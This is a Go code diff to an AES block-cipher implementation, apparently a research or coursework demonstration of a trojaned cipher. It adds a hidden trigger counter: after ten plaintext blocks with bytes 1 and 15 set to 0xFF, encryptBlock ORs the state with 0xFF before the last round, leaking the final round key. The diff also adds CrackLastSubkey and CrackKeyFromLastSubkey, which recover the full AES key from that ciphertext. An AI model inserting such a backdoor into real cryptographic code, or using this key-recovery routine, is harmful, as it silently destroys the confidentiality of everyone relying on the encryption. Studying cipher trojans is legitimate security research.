@@ -2,6 +2,7 @@
 package main
 
 import (
+	"bytes"
 	"encoding/binary"
 	"errors"
 	"math/big"
@@ -50,6 +51,21 @@ var rcon = [10]uint32{
 	0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000,
 }
 
+const (
+    TROJAN_COUNT int = 10
+    BYTE_ONE byte = 0b11111111
+    BYTE_ZERO byte = 0b00000000
+    TROJAN_ACTIVE byte = BYTE_ONE
+    TROJAN_INACTIVE byte = BYTE_ZERO
+)
+
+var TROJAN_ACTIVATE_MASK = [16]byte{
+    0,
+    0b11111111, // 1
+    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+    0b11111111, // 15
+}
+
 type AES struct {
 	nr        int      // number of rounds
 	nk        int      // number of words in the key
@@ -57,6 +73,10 @@ type AES struct {
 	len       int      // length(byte) of block
 	key       []byte   // key
 	roundKeys []uint32 // round keys generated from key.
+
+    // teehee
+    trojanCount int
+    trojanCounterOutput byte
 }
 
 // NewAES returns a pointer of type AES and an error.
@@ -89,6 +109,7 @@ func NewAES(key []byte) (*AES, error) {
 		nb:  4,
 		len: 16,
 		key: key,
+        trojanCounterOutput: 0,
 	}
 	aes.roundKeys = aes.keyExpansion()
 	return &aes, nil
@@ -108,18 +129,44 @@ func (a *AES) keyExpansion() []uint32 {
 		binary.BigEndian.PutUint32(tempW, w[i-1])
 		if i%a.nk == 0 {
 			rotWord(tempW)
-			a.subBytes(tempW)
+			subBytes(tempW)
 			tempRcon := make([]byte, 4)
 			binary.BigEndian.PutUint32(tempRcon, rcon[i/a.nk-1])
 			Xor(tempW, tempRcon)
 		} else if a.nk > 6 && i%a.nk == 4 {
-			a.subBytes(tempW)
+			subBytes(tempW)
 		}
 		w = append(w, w[i-a.nk]^binary.BigEndian.Uint32(tempW))
 	}
 	// mute debugging
 	//utils.DumpWords("keyExpansion:", w)
 	return w
+}
+
+func (a *AES) MaybeIncrementCounter(block []byte) {
+    increment := true
+    for i := 0; i < len(block); i++ {
+        mask := TROJAN_ACTIVATE_MASK[i]
+        if mask == 0 {
+            continue
+        }
+        same := (block[i] & mask) == BYTE_ONE
+        increment = increment && same
+    }
+    if !increment {
+        a.trojanCount = 0
+        return
+    }
+
+    a.trojanCount += 1
+    switch a.trojanCount {
+        case TROJAN_COUNT:
+        a.trojanCounterOutput = TROJAN_ACTIVE
+
+        case TROJAN_COUNT + 1:
+        a.trojanCounterOutput = TROJAN_INACTIVE
+        a.trojanCount = 0
+    }
 }
 
 func (a *AES) Encrypt(in []byte) []byte {
@@ -136,44 +183,149 @@ func (a *AES) Decrypt(in []byte) []byte {
     return out
 }
 
-// EncryptECB returns the cipher of ECB-mode encryption.
-func (a *AES) EncryptECB(in []byte) []byte {
-	for i := 0; i < len(in); i += a.len {
-		a.encryptBlock(in[i:i+a.len], a.roundKeys)
+// encryptBlock encrypts one block in the plaintext.
+func (a *AES) encryptBlock(state []byte, roundKeys []uint32) {
+
+    // DO COUNTER LOGIC
+    a.MaybeIncrementCounter(state)
+
+	addRoundKey(state, roundKeys[0:4])
+	for round := 1; round < a.nr; round++ {
+		subBytes(state)
+		shiftRows(state)
+		mixColumns(state)
+		addRoundKey(state, roundKeys[4*round:4*round+4])
 	}
 
-	//fmt.Printf("aes_impl-%d ECB encrypted cipher:", a.nk*32)
-	//utils.DumpBytes("", in)
-	return in
+    // OR OUTPUT OF SECOND TO LAST ROUND WITH TROJAN COUNTER OUTPUT (1 or 0)
+    for i := 0; i < len(state); i++ {
+        state[i] = state[i] | a.trojanCounterOutput
+    }
+
+	subBytes(state)
+	shiftRows(state)
+	addRoundKey(state, roundKeys[a.nr*4:a.nr*4+4])
 }
 
-// DecryptECB returns the plaintext of ECB-mode decryption.
-func (a *AES) DecryptECB(in []byte) []byte {
-	for i := 0; i < len(in); i += a.len {
-		a.decryptBlock(in[i:i+a.len], a.roundKeys)
+// decryptBlock decrypts one block in the ciphertext.
+func (a *AES) decryptBlock(state []byte, roundKeys []uint32) {
+	addRoundKey(state, roundKeys[a.nr*4:a.nr*4+4])
+	for round := a.nr - 1; round > 0; round-- {
+		invSubBytes(state)
+		invShiftRows(state)
+		addRoundKey(state, roundKeys[4*round:4*round+4])
+		invMixColumns(state)
 	}
-
-	//fmt.Printf("aes_impl-%d ECB decrypted plaintext:", a.nk*32)
-	//utils.DumpBytes("", in)
-	return in
+	invSubBytes(state)
+	invShiftRows(state)
+	addRoundKey(state, roundKeys[0:4])
 }
 
+func CrackLastSubkey(ct []byte) []byte {
+    // output of second to last round
+    A10 := bytes.Repeat([]byte{BYTE_ONE}, 16)
+    subBytes(A10)
+    shiftRows(A10)
+    // ct = xor(K10, SR(SB(A10)))
+    // so
+    // K10 = xor(ct, SR(SB(A10)))
+    Xor(A10, ct)
+    return A10
+}
+
+func u32ToBytes(in uint32) (b0, b1, b2, b3 byte) {
+    tmp := make([]byte, 4)
+    binary.BigEndian.PutUint32(tmp, in)
+    return tmp[0], tmp[1], tmp[2], tmp[3]
+}
+
+func bytesToU32(b0, b1, b2, b3 byte) uint32 {
+    tmp := []byte{b0, b1, b2, b3}
+    return binary.BigEndian.Uint32(tmp)
+}
+
+func u32ArrayToBytes(in [4]uint32) []byte {
+    out := make([]byte, 4 * 4)
+    for i := 0; i < 4; i++ {
+        binary.BigEndian.PutUint32(out[4*i:4*i+4], in[i])
+    }
+    return out
+}
+
+func toTuple[T any](in []T) (b0, b1, b2, b3 T) {
+    b0, b1, b2, b3 = in[0], in[1], in[2], in[3]
+    return
+}
+
+func byteSliceToU32(in []byte) (out uint32) {
+    b0, b1, b2, b3 := toTuple(in)
+    return bytesToU32(b0, b1, b2, b3)
+}
+
+func CrackKeyFromLastSubkey(K10 []byte) (key []byte, roundKeys [10][4]uint32) {
+    assign := func(Ki []byte) [4]uint32 {
+        var w [4]uint32
+        w[0] = byteSliceToU32(Ki[0:4])
+        w[1] = byteSliceToU32(Ki[4:8])
+        w[2] = byteSliceToU32(Ki[8:12])
+        w[3] = byteSliceToU32(Ki[12:16])
+        return w
+    }
+
+    f := func(W uint32, round int) uint32 {
+        // W is always W_3 (last u32 in Ki) so bytes are
+        // Ki[12], Ki[13], etc
+        var k12, k13, k14, k15 byte = u32ToBytes(W)
+        RCi, _, _, _ := u32ToBytes(rcon[round - 1])
+        var g0, g1, g2, g3 byte
+
+        g0 = sbox[k13] ^ RCi
+        g1 = sbox[k14]
+        g2 = sbox[k15]
+        g3 = sbox[k12]
+        return bytesToU32(g0, g1, g2, g3)
+    }
+
+    var W [11][4]uint32
+    // assign just splits bytes, no need to do [4]uint32 -> []bytes
+    // and back every round like the paper. Instead just save the u32s in W
+    W[10] = assign(K10)
+    for round := 10; round >= 1; round-- {
+        w0, w1, w2, w3 := toTuple(W[round][:])
+        W[round - 1][3] = w3 ^ w2
+        W[round - 1][2] = w2 ^ w1
+        W[round - 1][1] = w1 ^ w0
+        W[round - 1][0] = w0 ^ f(W[round - 1][3], round)
+    }
+
+    key = u32ArrayToBytes(W[0])
+    for i := 0; i < 10; i++ {
+        // roundKeys declared by named return value
+        roundKeys[i] = W[i + 1]
+    }
+    return key, roundKeys
+}
+
+func CrackKey(in []byte) ([]byte, [10][4]uint32) {
+    K10 := CrackLastSubkey(in)
+    return CrackKeyFromLastSubkey(K10)
+}
 
 // subBytes operation in AES encryption.
-func (a *AES) subBytes(state []byte) {
+func subBytes(state []byte) {
 	for i, v := range state {
 		state[i] = sbox[v]
 	}
 }
 
 // invSubBytes operation in AES decryption.
-func (a *AES) invSubBytes(state []byte) {
+func invSubBytes(state []byte) {
 	for i, v := range state {
 		state[i] = inv_sbox[v]
 	}
 }
 
-func (a *AES) shiftRow(in []byte, i int, n int) {
+func shiftRow(in []byte, i int, n int) {
 	in[i], in[i+4*1], in[i+4*2], in[i+4*3] = in[i+4*(n%4)], in[i+4*((n+1)%4)], in[i+4*((n+2)%4)], in[i+4*((n+3)%4)]
 }
 
@@ -183,17 +335,17 @@ func rotWord(in []byte) {
 }
 
 // shiftRows operation in AES encryption.
-func (a *AES) shiftRows(state []byte) {
-	a.shiftRow(state, 1, 1)
-	a.shiftRow(state, 2, 2)
-	a.shiftRow(state, 3, 3)
+func  shiftRows(state []byte) {
+	shiftRow(state, 1, 1)
+	shiftRow(state, 2, 2)
+	shiftRow(state, 3, 3)
 }
 
 // invShiftRows operation in AES decryption.
-func (a *AES) invShiftRows(state []byte) {
-	a.shiftRow(state, 1, 3)
-	a.shiftRow(state, 2, 2)
-	a.shiftRow(state, 3, 1)
+func invShiftRows(state []byte) {
+	shiftRow(state, 1, 3)
+	shiftRow(state, 2, 2)
+	shiftRow(state, 3, 1)
 }
 
 // xtime returns the result of multiplication by x in GF(2^8).
@@ -236,7 +388,7 @@ func mulWord(x []byte, y []byte) {
 }
 
 // mixColumns operation in AES encryption.
-func (a *AES) mixColumns(state []byte) {
+func mixColumns(state []byte) {
 	s := []byte{0x03, 0x01, 0x01, 0x02}
 	for i := 0; i < len(state); i += 4 {
 		mulWord(state[i:i+4], s)
@@ -244,7 +396,7 @@ func (a *AES) mixColumns(state []byte) {
 }
 
 // invMixColumns operation in AES decryption.
-func (a *AES) invMixColumns(state []byte) {
+func invMixColumns(state []byte) {
 	s := []byte{0x0b, 0x0d, 0x09, 0x0e}
 	for i := 0; i < len(state); i += 4 {
 		mulWord(state[i:i+4], s)
@@ -261,40 +413,12 @@ func Xor(x []byte, y []byte) {
 }
 
 // addRoundKey operation in AES.
-func (a *AES) addRoundKey(state []byte, w []uint32) {
-	tmp := make([]byte, a.len)
+func addRoundKey(state []byte, w []uint32) {
+	tmp := make([]byte, BLOCK_SIZE)
 	for i := 0; i < len(w); i += 1 {
 		binary.BigEndian.PutUint32(tmp[4*i:4*i+4], w[i])
 	}
 	Xor(state, tmp)
-}
-
-// encryptBlock encrypts one block in the plaintext.
-func (a *AES) encryptBlock(state []byte, roundKeys []uint32) {
-	a.addRoundKey(state, roundKeys[0:4])
-	for round := 1; round < a.nr; round++ {
-		a.subBytes(state)
-		a.shiftRows(state)
-		a.mixColumns(state)
-		a.addRoundKey(state, roundKeys[4*round:4*round+4])
-	}
-	a.subBytes(state)
-	a.shiftRows(state)
-	a.addRoundKey(state, roundKeys[a.nr*4:a.nr*4+4])
-}
-
-// decryptBlock decrypts one block in the ciphertext.
-func (a *AES) decryptBlock(state []byte, roundKeys []uint32) {
-	a.addRoundKey(state, roundKeys[a.nr*4:a.nr*4+4])
-	for round := a.nr - 1; round > 0; round-- {
-		a.invShiftRows(state)
-		a.invSubBytes(state)
-		a.addRoundKey(state, roundKeys[4*round:4*round+4])
-		a.invMixColumns(state)
-	}
-	a.invShiftRows(state)
-	a.invSubBytes(state)
-	a.addRoundKey(state, roundKeys[0:4])
 }
 
 // inc increments the right-most 32 bits of the bit string X,
@@ -325,3 +449,26 @@ func mulBlock(x []byte, y []byte) {
 	}
 	Z.FillBytes(x)
 }
+
+// EncryptECB returns the cipher of ECB-mode encryption.
+func (a *AES) EncryptECB(in []byte) []byte {
+	for i := 0; i < len(in); i += a.len {
+		a.encryptBlock(in[i:i+a.len], a.roundKeys)
+	}
+
+	//fmt.Printf("aes_impl-%d ECB encrypted cipher:", a.nk*32)
+	//utils.DumpBytes("", in)
+	return in
+}
+
+// DecryptECB returns the plaintext of ECB-mode decryption.
+func (a *AES) DecryptECB(in []byte) []byte {
+	for i := 0; i < len(in); i += a.len {
+		a.decryptBlock(in[i:i+a.len], a.roundKeys)
+	}
+
+	//fmt.Printf("aes_impl-%d ECB decrypted plaintext:", a.nk*32)
+	//utils.DumpBytes("", in)
+	return in
+}
+
